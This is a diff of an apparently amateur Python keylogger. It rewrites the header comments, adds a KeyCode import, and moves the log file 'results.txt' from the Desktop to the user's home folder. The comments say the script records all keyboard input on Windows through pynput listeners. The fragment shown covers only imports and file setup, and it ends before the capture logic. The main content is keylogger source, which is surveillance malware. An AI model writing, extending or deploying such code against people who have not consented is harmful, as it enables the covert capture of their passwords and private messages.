@@ -1,31 +1,21 @@
-# Phase 1: Building the keylogger script
-# Description & features: 
-# The keylogger works specially with focus on Windows using a path for store in a .txt file
-# all the inputs of the user
-
-# Twice input bug fixed successfully
-
-#things to improve:
-# - Add a translation to NumPad like:
-# - Number Pad #1 = 97
-# - the keys as * or + on the numeration pad are translated correctly
-# - Keys as F3 are available
+''' Phase 1: Building the keylogger script
+Description & features: 
+The keylogger works specially with focus on Windows using a path for store in a .txt file all the inputs of the user
+The keylogger is designed to log keystrokes in a file named "results.txt" located on the user's desktop.
+It captures both regular character keys and special keys (like space, enter, backspace)'''
 
 import logging #used to log the keystrokes to a file
 import os #use to handle files or paths
 from threading import Thread, Lock #for run multiple threat
-from pynput.keyboard import Key, Listener as KeyboardListener #for listen all the inputs of the keyboard
+from pynput.keyboard import Key, KeyCode, Listener as KeyboardListener #for listen all the inputs of the keyboard
 import time #for delay
 
 
 #Specify the dir and file of the log file
-directory = os.path.join(os.path.expanduser("~"), "Desktop") #Open this path
-#expanduser("~") is fot expand the current user's home dir where the scrip
-#For be specific C:\Users\Public or PrivateU\Desktop or other folder
-#OR choose whatever path u want :)
+directory = os.path.join(os.path.expanduser("~"), "") 
 
 filename = "results.txt" #name of the file
-path = os.path.join (directory, filename)
+path = os.path.join(directory, filename)
 pressed_keys = set() #this var tracks pressed keys
 
 #configure a basic config
